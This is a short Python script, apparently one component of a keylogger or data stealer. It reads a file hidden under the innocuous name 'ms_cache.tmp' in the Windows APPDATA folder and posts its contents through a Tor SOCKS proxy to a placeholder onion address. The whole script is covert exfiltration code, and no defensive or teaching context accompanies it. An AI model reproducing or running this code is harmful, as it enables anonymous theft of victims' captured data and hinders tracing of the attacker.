# send_via_tor.py
import requests
import os

tor_proxies = {
    'http': 'socks5h://127.0.0.1:9050',
    'https': 'socks5h://127.0.0.1:9050'
}

log_path = os.path.join(os.getenv("APPDATA"), "ms_cache.tmp")

with open(log_path, "r") as f:
    log_data = f.read()

r = requests.post("http://yourhiddenservice.onion/log", data={"log": log_data}, proxies=tor_proxies)
print("Sent:", r.status_code)
